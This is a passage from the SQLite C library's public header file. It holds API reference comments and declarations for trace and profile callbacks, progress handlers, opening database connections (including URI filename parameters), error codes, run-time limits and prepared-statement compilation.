** time is in units of nanoseconds, however the current implementation
** is only capable of millisecond resolution so the six least significant
** digits in the time are meaningless.  Future versions of SQLite
** might provide greater resolution on the profiler callback.  Invoking
** either [sqlite3_trace()] or [sqlite3_trace_v2()] will cancel the
** profile callback.
*/
SQLITE_API SQLITE_DEPRECATED void *sqlite3_trace(sqlite3*,
   void(*xTrace)(void*,const char*), void*);
SQLITE_API SQLITE_DEPRECATED void *sqlite3_profile(sqlite3*,
   void(*xProfile)(void*,const char*,sqlite3_uint64), void*);

/*
** CAPI3REF: SQL Trace Event Codes
** KEYWORDS: SQLITE_TRACE
**
** These constants identify classes of events that can be monitored
** using the [sqlite3_trace_v2()] tracing logic.  The M argument
** to [sqlite3_trace_v2(D,M,X,P)] is an OR-ed combination of one or more of
** the following constants.  ^The first argument to the trace callback
** is one of the following constants.
**
** New tracing constants may be added in future releases.
**
** ^A trace callback has four arguments: xCallback(T,C,P,X).
** ^The T argument is one of the integer type codes above.
** ^The C argument is a copy of the context pointer passed in as the
** fourth argument to [sqlite3_trace_v2()].
** The P and X arguments are pointers whose meanings depend on T.
**
** <dl>
** [[SQLITE_TRACE_STMT]] <dt>SQLITE_TRACE_STMT</dt>
** <dd>^An SQLITE_TRACE_STMT callback is invoked when a prepared statement
** first begins running and possibly at other times during the
** execution of the prepared statement, such as at the start of each
** trigger subprogram. ^The P argument is a pointer to the
** [prepared statement]. ^The X argument is a pointer to a string which
** is the unexpanded SQL text of the prepared statement or an SQL comment 
** that indicates the invocation of a trigger.  ^The callback can compute
** the same text that would have been returned by the legacy [sqlite3_trace()]
** interface by using the X argument when X begins with "--" and invoking
** [sqlite3_expanded_sql(P)] otherwise.
**
** [[SQLITE_TRACE_PROFILE]] <dt>SQLITE_TRACE_PROFILE</dt>
** <dd>^An SQLITE_TRACE_PROFILE callback provides approximately the same
** information as is provided by the [sqlite3_profile()] callback.
** ^The P argument is a pointer to the [prepared statement] and the
** X argument points to a 64-bit integer which is the estimated of
** the number of nanosecond that the prepared statement took to run.
** ^The SQLITE_TRACE_PROFILE callback is invoked when the statement finishes.
**
** [[SQLITE_TRACE_ROW]] <dt>SQLITE_TRACE_ROW</dt>
** <dd>^An SQLITE_TRACE_ROW callback is invoked whenever a prepared
** statement generates a single row of result.  
** ^The P argument is a pointer to the [prepared statement] and the
** X argument is unused.
**
** [[SQLITE_TRACE_CLOSE]] <dt>SQLITE_TRACE_CLOSE</dt>
** <dd>^An SQLITE_TRACE_CLOSE callback is invoked when a database
** connection closes.
** ^The P argument is a pointer to the [database connection] object
** and the X argument is unused.
** </dl>
*/
#define SQLITE_TRACE_STMT       0x01
#define SQLITE_TRACE_PROFILE    0x02
#define SQLITE_TRACE_ROW        0x04
#define SQLITE_TRACE_CLOSE      0x08

/*
** CAPI3REF: SQL Trace Hook
** METHOD: sqlite3
**
** ^The sqlite3_trace_v2(D,M,X,P) interface registers a trace callback
** function X against [database connection] D, using property mask M
** and context pointer P.  ^If the X callback is
** NULL or if the M mask is zero, then tracing is disabled.  The
** M argument should be the bitwise OR-ed combination of
** zero or more [SQLITE_TRACE] constants.
**
** ^Each call to either sqlite3_trace() or sqlite3_trace_v2() overrides 
** (cancels) any prior calls to sqlite3_trace() or sqlite3_trace_v2().
**
** ^The X callback is invoked whenever any of the events identified by 
** mask M occur.  ^The integer return value from the callback is currently
** ignored, though this may change in future releases.  Callback
** implementations should return zero to ensure future compatibility.
**
** ^A trace callback is invoked with four arguments: callback(T,C,P,X).
** ^The T argument is one of the [SQLITE_TRACE]
** constants to indicate why the callback was invoked.
** ^The C argument is a copy of the context pointer.
** The P and X arguments are pointers whose meanings depend on T.
**
** The sqlite3_trace_v2() interface is intended to replace the legacy
** interfaces [sqlite3_trace()] and [sqlite3_profile()], both of which
** are deprecated.
*/
SQLITE_API int sqlite3_trace_v2(
  sqlite3*,
  unsigned uMask,
  int(*xCallback)(unsigned,void*,void*,void*),
  void *pCtx
);

/*
** CAPI3REF: Query Progress Callbacks
** METHOD: sqlite3
**
** ^The sqlite3_progress_handler(D,N,X,P) interface causes the callback
** function X to be invoked periodically during long running calls to
** [sqlite3_exec()], [sqlite3_step()] and [sqlite3_get_table()] for
** database connection D.  An example use for this
** interface is to keep a GUI updated during a large query.
**
** ^The parameter P is passed through as the only parameter to the 
** callback function X.  ^The parameter N is the approximate number of 
** [virtual machine instructions] that are evaluated between successive
** invocations of the callback X.  ^If N is less than one then the progress
** handler is disabled.
**
** ^Only a single progress handler may be defined at one time per
** [database connection]; setting a new progress handler cancels the
** old one.  ^Setting parameter X to NULL disables the progress handler.
** ^The progress handler is also disabled by setting N to a value less
** than 1.
**
** ^If the progress callback returns non-zero, the operation is
** interrupted.  This feature can be used to implement a
** "Cancel" button on a GUI progress dialog box.
**
** The progress handler callback must not do anything that will modify
** the database connection that invoked the progress handler.
** Note that [sqlite3_prepare_v2()] and [sqlite3_step()] both modify their
** database connections for the meaning of "modify" in this paragraph.
**
*/
SQLITE_API void sqlite3_progress_handler(sqlite3*, int, int(*)(void*), void*);

/*
** CAPI3REF: Opening A New Database Connection
** CONSTRUCTOR: sqlite3
**
** ^These routines open an SQLite database file as specified by the 
** filename argument. ^The filename argument is interpreted as UTF-8 for
** sqlite3_open() and sqlite3_open_v2() and as UTF-16 in the native byte
** order for sqlite3_open16(). ^(A [database connection] handle is usually
** returned in *ppDb, even if an error occurs.  The only exception is that
** if SQLite is unable to allocate memory to hold the [sqlite3] object,
** a NULL will be written into *ppDb instead of a pointer to the [sqlite3]
** object.)^ ^(If the database is opened (and/or created) successfully, then
** [SQLITE_OK] is returned.  Otherwise an [error code] is returned.)^ ^The
** [sqlite3_errmsg()] or [sqlite3_errmsg16()] routines can be used to obtain
** an English language description of the error following a failure of any
** of the sqlite3_open() routines.
**
** ^The default encoding will be UTF-8 for databases created using
** sqlite3_open() or sqlite3_open_v2().  ^The default encoding for databases
** created using sqlite3_open16() will be UTF-16 in the native byte order.
**
** Whether or not an error occurs when it is opened, resources
** associated with the [database connection] handle should be released by
** passing it to [sqlite3_close()] when it is no longer required.
**
** The sqlite3_open_v2() interface works like sqlite3_open()
** except that it accepts two additional parameters for additional control
** over the new database connection.  ^(The flags parameter to
** sqlite3_open_v2() can take one of
** the following three values, optionally combined with the 
** [SQLITE_OPEN_NOMUTEX], [SQLITE_OPEN_FULLMUTEX], [SQLITE_OPEN_SHAREDCACHE],
** [SQLITE_OPEN_PRIVATECACHE], and/or [SQLITE_OPEN_URI] flags:)^
**
** <dl>
** ^(<dt>[SQLITE_OPEN_READONLY]</dt>
** <dd>The database is opened in read-only mode.  If the database does not
** already exist, an error is returned.</dd>)^
**
** ^(<dt>[SQLITE_OPEN_READWRITE]</dt>
** <dd>The database is opened for reading and writing if possible, or reading
** only if the file is write protected by the operating system.  In either
** case the database must already exist, otherwise an error is returned.</dd>)^
**
** ^(<dt>[SQLITE_OPEN_READWRITE] | [SQLITE_OPEN_CREATE]</dt>
** <dd>The database is opened for reading and writing, and is created if
** it does not already exist. This is the behavior that is always used for
** sqlite3_open() and sqlite3_open16().</dd>)^
** </dl>
**
** If the 3rd parameter to sqlite3_open_v2() is not one of the
** combinations shown above optionally combined with other
** [SQLITE_OPEN_READONLY | SQLITE_OPEN_* bits]
** then the behavior is undefined.
**
** ^If the [SQLITE_OPEN_NOMUTEX] flag is set, then the database connection
** opens in the multi-thread [threading mode] as long as the single-thread
** mode has not been set at compile-time or start-time.  ^If the
** [SQLITE_OPEN_FULLMUTEX] flag is set then the database connection opens
** in the serialized [threading mode] unless single-thread was
** previously selected at compile-time or start-time.
** ^The [SQLITE_OPEN_SHAREDCACHE] flag causes the database connection to be
** eligible to use [shared cache mode], regardless of whether or not shared
** cache is enabled using [sqlite3_enable_shared_cache()].  ^The
** [SQLITE_OPEN_PRIVATECACHE] flag causes the database connection to not
** participate in [shared cache mode] even if it is enabled.
**
** ^The fourth parameter to sqlite3_open_v2() is the name of the
** [sqlite3_vfs] object that defines the operating system interface that
** the new database connection should use.  ^If the fourth parameter is
** a NULL pointer then the default [sqlite3_vfs] object is used.
**
** ^If the filename is ":memory:", then a private, temporary in-memory database
** is created for the connection.  ^This in-memory database will vanish when
** the database connection is closed.  Future versions of SQLite might
** make use of additional special filenames that begin with the ":" character.
** It is recommended that when a database filename actually does begin with
** a ":" character you should prefix the filename with a pathname such as
** "./" to avoid ambiguity.
**
** ^If the filename is an empty string, then a private, temporary
** on-disk database will be created.  ^This private database will be
** automatically deleted as soon as the database connection is closed.
**
** [[URI filenames in sqlite3_open()]] <h3>URI Filenames</h3>
**
** ^If [URI filename] interpretation is enabled, and the filename argument
** begins with "file:", then the filename is interpreted as a URI. ^URI
** filename interpretation is enabled if the [SQLITE_OPEN_URI] flag is
** set in the third argument to sqlite3_open_v2(), or if it has
** been enabled globally using the [SQLITE_CONFIG_URI] option with the
** [sqlite3_config()] method or by the [SQLITE_USE_URI] compile-time option.
** URI filename interpretation is turned off
** by default, but future releases of SQLite might enable URI filename
** interpretation by default.  See "[URI filenames]" for additional
** information.
**
** URI filenames are parsed according to RFC 3986. ^If the URI contains an
** authority, then it must be either an empty string or the string 
** "localhost". ^If the authority is not an empty string or "localhost", an 
** error is returned to the caller. ^The fragment component of a URI, if 
** present, is ignored.
**
** ^SQLite uses the path component of the URI as the name of the disk file
** which contains the database. ^If the path begins with a '/' character, 
** then it is interpreted as an absolute path. ^If the path does not begin 
** with a '/' (meaning that the authority section is omitted from the URI)
** then the path is interpreted as a relative path. 
** ^(On windows, the first component of an absolute path 
** is a drive specification (e.g. "C:").)^
**
** [[core URI query parameters]]
** The query component of a URI may contain parameters that are interpreted
** either by SQLite itself, or by a [VFS | custom VFS implementation].
** SQLite and its built-in [VFSes] interpret the
** following query parameters:
**
** <ul>
**   <li> <b>vfs</b>: ^The "vfs" parameter may be used to specify the name of
**     a VFS object that provides the operating system interface that should
**     be used to access the database file on disk. ^If this option is set to
**     an empty string the default VFS object is used. ^Specifying an unknown
**     VFS is an error. ^If sqlite3_open_v2() is used and the vfs option is
**     present, then the VFS specified by the option takes precedence over
**     the value passed as the fourth parameter to sqlite3_open_v2().
**
**   <li> <b>mode</b>: ^(The mode parameter may be set to either "ro", "rw",
**     "rwc", or "memory". Attempting to set it to any other value is
**     an error)^. 
**     ^If "ro" is specified, then the database is opened for read-only 
**     access, just as if the [SQLITE_OPEN_READONLY] flag had been set in the 
**     third argument to sqlite3_open_v2(). ^If the mode option is set to 
**     "rw", then the database is opened for read-write (but not create) 
**     access, as if SQLITE_OPEN_READWRITE (but not SQLITE_OPEN_CREATE) had 
**     been set. ^Value "rwc" is equivalent to setting both 
**     SQLITE_OPEN_READWRITE and SQLITE_OPEN_CREATE.  ^If the mode option is
**     set to "memory" then a pure [in-memory database] that never reads
**     or writes from disk is used. ^It is an error to specify a value for
**     the mode parameter that is less restrictive than that specified by
**     the flags passed in the third parameter to sqlite3_open_v2().
**
**   <li> <b>cache</b>: ^The cache parameter may be set to either "shared" or
**     "private". ^Setting it to "shared" is equivalent to setting the
**     SQLITE_OPEN_SHAREDCACHE bit in the flags argument passed to
**     sqlite3_open_v2(). ^Setting the cache parameter to "private" is 
**     equivalent to setting the SQLITE_OPEN_PRIVATECACHE bit.
**     ^If sqlite3_open_v2() is used and the "cache" parameter is present in
**     a URI filename, its value overrides any behavior requested by setting
**     SQLITE_OPEN_PRIVATECACHE or SQLITE_OPEN_SHAREDCACHE flag.
**
**  <li> <b>psow</b>: ^The psow parameter indicates whether or not the
**     [powersafe overwrite] property does or does not apply to the
**     storage media on which the database file resides.
**
**  <li> <b>nolock</b>: ^The nolock parameter is a boolean query parameter
**     which if set disables file locking in rollback journal modes.  This
**     is useful for accessing a database on a filesystem that does not
**     support locking.  Caution:  Database corruption might result if two
**     or more processes write to the same database and any one of those
**     processes uses nolock=1.
**
**  <li> <b>immutable</b>: ^The immutable parameter is a boolean query
**     parameter that indicates that the database file is stored on
**     read-only media.  ^When immutable is set, SQLite assumes that the
**     database file cannot be changed, even by a process with higher
**     privilege, and so the database is opened read-only and all locking
**     and change detection is disabled.  Caution: Setting the immutable
**     property on a database file that does in fact change can result
**     in incorrect query results and/or [SQLITE_CORRUPT] errors.
**     See also: [SQLITE_IOCAP_IMMUTABLE].
**       
** </ul>
**
** ^Specifying an unknown parameter in the query component of a URI is not an
** error.  Future versions of SQLite might understand additional query
** parameters.  See "[query parameters with special meaning to SQLite]" for
** additional information.
**
** [[URI filename examples]] <h3>URI filename examples</h3>
**
** <table border="1" align=center cellpadding=5>
** <tr><th> URI filenames <th> Results
** <tr><td> file:data.db <td> 
**          Open the file "data.db" in the current directory.
** <tr><td> file:/home/fred/data.db<br>
**          file:///home/fred/data.db <br> 
**          file://localhost/home/fred/data.db <br> <td> 
**          Open the database file "/home/fred/data.db".
** <tr><td> file://darkstar/home/fred/data.db <td> 
**          An error. "darkstar" is not a recognized authority.
** <tr><td style="white-space:nowrap"> 
**          file:///C:/Documents%20and%20Settings/fred/Desktop/data.db
**     <td> Windows only: Open the file "data.db" on fred's desktop on drive
**          C:. Note that the %20 escaping in this example is not strictly 
**          necessary - space characters can be used literally
**          in URI filenames.
** <tr><td> file:data.db?mode=ro&cache=private <td> 
**          Open file "data.db" in the current directory for read-only access.
**          Regardless of whether or not shared-cache mode is enabled by
**          default, use a private cache.
** <tr><td> file:/home/fred/data.db?vfs=unix-dotfile <td>
**          Open file "/home/fred/data.db". Use the special VFS "unix-dotfile"
**          that uses dot-files in place of posix advisory locking.
** <tr><td> file:data.db?mode=readonly <td> 
**          An error. "readonly" is not a valid option for the "mode" parameter.
** </table>
**
** ^URI hexadecimal escape sequences (%HH) are supported within the path and
** query components of a URI. A hexadecimal escape sequence consists of a
** percent sign - "%" - followed by exactly two hexadecimal digits 
** specifying an octet value. ^Before the path or query components of a
** URI filename are interpreted, they are encoded using UTF-8 and all 
** hexadecimal escape sequences replaced by a single byte containing the
** corresponding octet. If this process generates an invalid UTF-8 encoding,
** the results are undefined.
**
** <b>Note to Windows users:</b>  The encoding used for the filename argument
** of sqlite3_open() and sqlite3_open_v2() must be UTF-8, not whatever
** codepage is currently defined.  Filenames containing international
** characters must be converted to UTF-8 prior to passing them into
** sqlite3_open() or sqlite3_open_v2().
**
** <b>Note to Windows Runtime users:</b>  The temporary directory must be set
** prior to calling sqlite3_open() or sqlite3_open_v2().  Otherwise, various
** features that require the use of temporary files may fail.
**
** See also: [sqlite3_temp_directory]
*/
SQLITE_API int sqlite3_open(
  const char *filename,   /* Database filename (UTF-8) */
  sqlite3 **ppDb          /* OUT: SQLite db handle */
);
SQLITE_API int sqlite3_open16(
  const void *filename,   /* Database filename (UTF-16) */
  sqlite3 **ppDb          /* OUT: SQLite db handle */
);
SQLITE_API int sqlite3_open_v2(
  const char *filename,   /* Database filename (UTF-8) */
  sqlite3 **ppDb,         /* OUT: SQLite db handle */
  int flags,              /* Flags */
  const char *zVfs        /* Name of VFS module to use */
);

/*
** CAPI3REF: Obtain Values For URI Parameters
**
** These are utility routines, useful to VFS implementations, that check
** to see if a database file was a URI that contained a specific query 
** parameter, and if so obtains the value of that query parameter.
**
** If F is the database filename pointer passed into the xOpen() method of 
** a VFS implementation when the flags parameter to xOpen() has one or 
** more of the [SQLITE_OPEN_URI] or [SQLITE_OPEN_MAIN_DB] bits set and
** P is the name of the query parameter, then
** sqlite3_uri_parameter(F,P) returns the value of the P
** parameter if it exists or a NULL pointer if P does not appear as a 
** query parameter on F.  If P is a query parameter of F
** has no explicit value, then sqlite3_uri_parameter(F,P) returns
** a pointer to an empty string.
**
** The sqlite3_uri_boolean(F,P,B) routine assumes that P is a boolean
** parameter and returns true (1) or false (0) according to the value
** of P.  The sqlite3_uri_boolean(F,P,B) routine returns true (1) if the
** value of query parameter P is one of "yes", "true", or "on" in any
** case or if the value begins with a non-zero number.  The 
** sqlite3_uri_boolean(F,P,B) routines returns false (0) if the value of
** query parameter P is one of "no", "false", or "off" in any case or
** if the value begins with a numeric zero.  If P is not a query
** parameter on F or if the value of P is does not match any of the
** above, then sqlite3_uri_boolean(F,P,B) returns (B!=0).
**
** The sqlite3_uri_int64(F,P,D) routine converts the value of P into a
** 64-bit signed integer and returns that integer, or D if P does not
** exist.  If the value of P is something other than an integer, then
** zero is returned.
** 
** If F is a NULL pointer, then sqlite3_uri_parameter(F,P) returns NULL and
** sqlite3_uri_boolean(F,P,B) returns B.  If F is not a NULL pointer and
** is not a database file pathname pointer that SQLite passed into the xOpen
** VFS method, then the behavior of this routine is undefined and probably
** undesirable.
**
** See the [URI filename] documentation for additional information.
*/
SQLITE_API const char *sqlite3_uri_parameter(const char *zFilename, const char *zParam);
SQLITE_API int sqlite3_uri_boolean(const char *zFile, const char *zParam, int bDefault);
SQLITE_API sqlite3_int64 sqlite3_uri_int64(const char*, const char*, sqlite3_int64);


/*
** CAPI3REF: Error Codes And Messages
** METHOD: sqlite3
**
** ^If the most recent sqlite3_* API call associated with 
** [database connection] D failed, then the sqlite3_errcode(D) interface
** returns the numeric [result code] or [extended result code] for that
** API call.
** ^The sqlite3_extended_errcode()
** interface is the same except that it always returns the 
** [extended result code] even when extended result codes are
** disabled.
**
** The values returned by sqlite3_errcode() and/or
** sqlite3_extended_errcode() might change with each API call.
** Except, there are some interfaces that are guaranteed to never
** change the value of the error code.  The error-code preserving
** interfaces are:
**
** <ul>
** <li> sqlite3_errcode()
** <li> sqlite3_extended_errcode()
** <li> sqlite3_errmsg()
** <li> sqlite3_errmsg16()
** </ul>
**
** ^The sqlite3_errmsg() and sqlite3_errmsg16() return English-language
** text that describes the error, as either UTF-8 or UTF-16 respectively.
** ^(Memory to hold the error message string is managed internally.
** The application does not need to worry about freeing the result.
** However, the error string might be overwritten or deallocated by
** subsequent calls to other SQLite interface functions.)^
**
** ^The sqlite3_errstr() interface returns the English-language text
** that describes the [result code], as UTF-8.
** ^(Memory to hold the error message string is managed internally
** and must not be freed by the application)^.
**
** When the serialized [threading mode] is in use, it might be the
** case that a second error occurs on a separate thread in between
** the time of the first error and the call to these interfaces.
** When that happens, the second error will be reported since these
** interfaces always report the most recent result.  To avoid
** this, each thread can obtain exclusive use of the [database connection] D
** by invoking [sqlite3_mutex_enter]([sqlite3_db_mutex](D)) before beginning
** to use D and invoking [sqlite3_mutex_leave]([sqlite3_db_mutex](D)) after
** all calls to the interfaces listed here are completed.
**
** If an interface fails with SQLITE_MISUSE, that means the interface
** was invoked incorrectly by the application.  In that case, the
** error code and message may or may not be set.
*/
SQLITE_API int sqlite3_errcode(sqlite3 *db);
SQLITE_API int sqlite3_extended_errcode(sqlite3 *db);
SQLITE_API const char *sqlite3_errmsg(sqlite3*);
SQLITE_API const void *sqlite3_errmsg16(sqlite3*);
SQLITE_API const char *sqlite3_errstr(int);

/*
** CAPI3REF: Prepared Statement Object
** KEYWORDS: {prepared statement} {prepared statements}
**
** An instance of this object represents a single SQL statement that
** has been compiled into binary form and is ready to be evaluated.
**
** Think of each SQL statement as a separate computer program.  The
** original SQL text is source code.  A prepared statement object 
** is the compiled object code.  All SQL must be converted into a
** prepared statement before it can be run.
**
** The life-cycle of a prepared statement object usually goes like this:
**
** <ol>
** <li> Create the prepared statement object using [sqlite3_prepare_v2()].
** <li> Bind values to [parameters] using the sqlite3_bind_*()
**      interfaces.
** <li> Run the SQL by calling [sqlite3_step()] one or more times.
** <li> Reset the prepared statement using [sqlite3_reset()] then go back
**      to step 2.  Do this zero or more times.
** <li> Destroy the object using [sqlite3_finalize()].
** </ol>
*/
typedef struct sqlite3_stmt sqlite3_stmt;

/*
** CAPI3REF: Run-time Limits
** METHOD: sqlite3
**
** ^(This interface allows the size of various constructs to be limited
** on a connection by connection basis.  The first parameter is the
** [database connection] whose limit is to be set or queried.  The
** second parameter is one of the [limit categories] that define a
** class of constructs to be size limited.  The third parameter is the
** new limit for that construct.)^
**
** ^If the new limit is a negative number, the limit is unchanged.
** ^(For each limit category SQLITE_LIMIT_<i>NAME</i> there is a 
** [limits | hard upper bound]
** set at compile-time by a C preprocessor macro called
** [limits | SQLITE_MAX_<i>NAME</i>].
** (The "_LIMIT_" in the name is changed to "_MAX_".))^
** ^Attempts to increase a limit above its hard upper bound are
** silently truncated to the hard upper bound.
**
** ^Regardless of whether or not the limit was changed, the 
** [sqlite3_limit()] interface returns the prior value of the limit.
** ^Hence, to find the current value of a limit without changing it,
** simply invoke this interface with the third parameter set to -1.
**
** Run-time limits are intended for use in applications that manage
** both their own internal database and also databases that are controlled
** by untrusted external sources.  An example application might be a
** web browser that has its own databases for storing history and
** separate databases controlled by JavaScript applications downloaded
** off the Internet.  The internal databases can be given the
** large, default limits.  Databases managed by external sources can
** be given much smaller limits designed to prevent a denial of service
** attack.  Developers might also want to use the [sqlite3_set_authorizer()]
** interface to further control untrusted SQL.  The size of the database
** created by an untrusted script can be contained using the
** [max_page_count] [PRAGMA].
**
** New run-time limit categories may be added in future releases.
*/
SQLITE_API int sqlite3_limit(sqlite3*, int id, int newVal);

/*
** CAPI3REF: Run-Time Limit Categories
** KEYWORDS: {limit category} {*limit categories}
**
** These constants define various performance limits
** that can be lowered at run-time using [sqlite3_limit()].
** The synopsis of the meanings of the various limits is shown below.
** Additional information is available at [limits | Limits in SQLite].
**
** <dl>
** [[SQLITE_LIMIT_LENGTH]] ^(<dt>SQLITE_LIMIT_LENGTH</dt>
** <dd>The maximum size of any string or BLOB or table row, in bytes.<dd>)^
**
** [[SQLITE_LIMIT_SQL_LENGTH]] ^(<dt>SQLITE_LIMIT_SQL_LENGTH</dt>
** <dd>The maximum length of an SQL statement, in bytes.</dd>)^
**
** [[SQLITE_LIMIT_COLUMN]] ^(<dt>SQLITE_LIMIT_COLUMN</dt>
** <dd>The maximum number of columns in a table definition or in the
** result set of a [SELECT] or the maximum number of columns in an index
** or in an ORDER BY or GROUP BY clause.</dd>)^
**
** [[SQLITE_LIMIT_EXPR_DEPTH]] ^(<dt>SQLITE_LIMIT_EXPR_DEPTH</dt>
** <dd>The maximum depth of the parse tree on any expression.</dd>)^
**
** [[SQLITE_LIMIT_COMPOUND_SELECT]] ^(<dt>SQLITE_LIMIT_COMPOUND_SELECT</dt>
** <dd>The maximum number of terms in a compound SELECT statement.</dd>)^
**
** [[SQLITE_LIMIT_VDBE_OP]] ^(<dt>SQLITE_LIMIT_VDBE_OP</dt>
** <dd>The maximum number of instructions in a virtual machine program
** used to implement an SQL statement.  If [sqlite3_prepare_v2()] or
** the equivalent tries to allocate space for more than this many opcodes
** in a single prepared statement, an SQLITE_NOMEM error is returned.</dd>)^
**
** [[SQLITE_LIMIT_FUNCTION_ARG]] ^(<dt>SQLITE_LIMIT_FUNCTION_ARG</dt>
** <dd>The maximum number of arguments on a function.</dd>)^
**
** [[SQLITE_LIMIT_ATTACHED]] ^(<dt>SQLITE_LIMIT_ATTACHED</dt>
** <dd>The maximum number of [ATTACH | attached databases].)^</dd>
**
** [[SQLITE_LIMIT_LIKE_PATTERN_LENGTH]]
** ^(<dt>SQLITE_LIMIT_LIKE_PATTERN_LENGTH</dt>
** <dd>The maximum length of the pattern argument to the [LIKE] or
** [GLOB] operators.</dd>)^
**
** [[SQLITE_LIMIT_VARIABLE_NUMBER]]
** ^(<dt>SQLITE_LIMIT_VARIABLE_NUMBER</dt>
** <dd>The maximum index number of any [parameter] in an SQL statement.)^
**
** [[SQLITE_LIMIT_TRIGGER_DEPTH]] ^(<dt>SQLITE_LIMIT_TRIGGER_DEPTH</dt>
** <dd>The maximum depth of recursion for triggers.</dd>)^
**
** [[SQLITE_LIMIT_WORKER_THREADS]] ^(<dt>SQLITE_LIMIT_WORKER_THREADS</dt>
** <dd>The maximum number of auxiliary worker threads that a single
** [prepared statement] may start.</dd>)^
** </dl>
*/
#define SQLITE_LIMIT_LENGTH                    0
#define SQLITE_LIMIT_SQL_LENGTH                1
#define SQLITE_LIMIT_COLUMN                    2
#define SQLITE_LIMIT_EXPR_DEPTH                3
#define SQLITE_LIMIT_COMPOUND_SELECT           4
#define SQLITE_LIMIT_VDBE_OP                   5
#define SQLITE_LIMIT_FUNCTION_ARG              6
#define SQLITE_LIMIT_ATTACHED                  7
#define SQLITE_LIMIT_LIKE_PATTERN_LENGTH       8
#define SQLITE_LIMIT_VARIABLE_NUMBER           9
#define SQLITE_LIMIT_TRIGGER_DEPTH            10
#define SQLITE_LIMIT_WORKER_THREADS           11

/*
** CAPI3REF: Prepare Flags
**
** These constants define various flags that can be passed into
** "prepFlags" parameter of the [sqlite3_prepare_v3()] and
** [sqlite3_prepare16_v3()] interfaces.
**
** New flags may be added in future releases of SQLite.
**
** <dl>
** [[SQLITE_PREPARE_PERSISTENT]] ^(<dt>SQLITE_PREPARE_PERSISTENT</dt>
** <dd>The SQLITE_PREPARE_PERSISTENT flag is a hint to the query planner
** that the prepared statement will be retained for a long time and
** probably reused many times.)^ ^Without this flag, [sqlite3_prepare_v3()]
** and [sqlite3_prepare16_v3()] assume that the prepared statement will 
** be used just once or at most a few times and then destroyed using
** [sqlite3_finalize()] relatively soon. The current implementation acts
** on this hint by avoiding the use of [lookaside memory] so as not to
** deplete the limited store of lookaside memory. Future versions of
** SQLite may act on this hint differently.
**
** [[SQLITE_PREPARE_NORMALIZE]] <dt>SQLITE_PREPARE_NORMALIZE</dt>
** <dd>The SQLITE_PREPARE_NORMALIZE flag is a no-op. This flag used
** to be required for any prepared statement that wanted to use the
** [sqlite3_normalized_sql()] interface.  However, the
** [sqlite3_normalized_sql()] interface is now available to all
** prepared statements, regardless of whether or not they use this
** flag.
**
** [[SQLITE_PREPARE_NO_VTAB]] <dt>SQLITE_PREPARE_NO_VTAB</dt>
** <dd>The SQLITE_PREPARE_NO_VTAB flag causes the SQL compiler
** to return an error (error code SQLITE_ERROR) if the statement uses
** any virtual tables.
** </dl>
*/
#define SQLITE_PREPARE_PERSISTENT              0x01
#define SQLITE_PREPARE_NORMALIZE               0x02
#define SQLITE_PREPARE_NO_VTAB                 0x04

/*
** CAPI3REF: Compiling An SQL Statement
** KEYWORDS: {SQL statement compiler}
** METHOD: sqlite3
** CONSTRUCTOR: sqlite3_stmt
**
** To execute an SQL statement, it must first be compiled into a byte-code
** program using one of these routines.  Or, in other words, these routines
** are constructors for the [prepared statement] object.
**
** The preferred routine to use is [sqlite3_prepare_v2()].  The
** [sqlite3_prepare()] interface is legacy and should be avoided.
** [sqlite3_prepare_v3()] has an extra "prepFlags" option that is used
** for special purposes.
**
** The use of the UTF-8 interfaces is preferred, as SQLite currently
** does all parsing using UTF-8.  The UTF-16 interfaces are provided
** as a convenience.  The UTF-16 interfaces work by converting the
** input text into UTF-8, then invoking the corresponding UTF-8 interface.
**
** The first argument, "db", is a [database connection] obtained from a
** prior successful call to [sqlite3_open()], [sqlite3_open_v2()] or
** [sqlite3_open16()].  The database connection must not have been closed.
**
** The second argument, "zSql", is the statement to be compiled, encoded
** as either UTF-8 or UTF-16.  The sqlite3_prepare(), sqlite3_prepare_v2(),
** and sqlite3_prepare_v3()
** interfaces use UTF-8, and sqlite3_prepare16(), sqlite3_prepare16_v2(),
** and sqlite3_prepare16_v3() use UTF-16.
**
** ^If the nByte argument is negative, then zSql is read up to the
** first zero terminator. ^If nByte is positive, then it is the
** number of bytes read from zSql.  ^If nByte is zero, then no prepared
** statement is generated.
** If the caller knows that the supplied string is nul-terminated, then
** there is a small performance advantage to passing an nByte parameter that
** is the number of bytes in the input string <i>including</i>
** the nul-terminator.
**
** ^If pzTail is not NULL then *pzTail is made to point to the first byte
** past the end of the first SQL statement in zSql.  These routines only
** compile the first statement in zSql, so *pzTail is left pointing to
** what remains uncompiled.
**
** ^*ppStmt is left pointing to a compiled [prepared statement] that can be
** executed using [sqlite3_step()].  ^If there is an error, *ppStmt is set
** to NULL.  ^If the input text contains no SQL (if the input is an empty
** string or a comment) then *ppStmt is set to NULL.
** The calling procedure is responsible for deleting the compiled
** SQL statement using [sqlite3_finalize()] after it has finished with it.
** ppStmt may not be NULL.
**
** ^On success, the sqlite3_prepare() family of routines return [SQLITE_OK];
** otherwise an [error code] is returned.
**
** The sqlite3_prepare_v2(), sqlite3_prepare_v3(), sqlite3_prepare16_v2(),
** and sqlite3_prepare16_v3() interfaces are recommended for all new programs.
** The older interfaces (sqlite3_prepare() and sqlite3_prepare16())
** are retained for backwards compatibility, but their use is discouraged.
** ^In the "vX" interfaces, the prepared statement
** that is returned (the [sqlite3_stmt] object) contains a copy of the
** original SQL text. This causes the [sqlite3_step()] interface to
** behave differently in three ways:
**
** <ol>
** <li>
** ^If the database schema changes, instead of returning [SQLITE_SCHEMA] as it
** always used to do, [sqlite3_step()] will automatically recompile the SQL
** statement and try to run it again. As many as [SQLITE_MAX_SCHEMA_RETRY]
** retries will occur before sqlite3_step() gives up and returns an error.
** </li>
**
** <li>
** ^When an error occurs, [sqlite3_step()] will return one of the detailed
** [error codes] or [extended error codes].  ^The legacy behavior was that
** [sqlite3_step()] would only return a generic [SQLITE_ERROR] result code
** and the application would have to make a second call to [sqlite3_reset()]
** in order to find the underlying cause of the problem. With the "v2" prepare
** interfaces, the underlying reason for the error is returned immediately.
** </li>
**
** <li>
** ^If the specific value bound to [parameter | host parameter] in the 
** WHERE clause might influence the choice of query plan for a statement,
** then the statement will be automatically recompiled, as if there had been 
** a schema change, on the first  [sqlite3_step()] call following any change
** to the [sqlite3_bind_text | bindings] of that [parameter]. 
** ^The specific value of WHERE-clause [parameter] might influence the 
** choice of query plan if the parameter is the left-hand side of a [LIKE]
** or [GLOB] operator or if the parameter is compared to an indexed column
** and the [SQLITE_ENABLE_STAT4] compile-time option is enabled.
** </li>
** </ol>
**
** <p>^sqlite3_prepare_v3() differs from sqlite3_prepare_v2() only in having
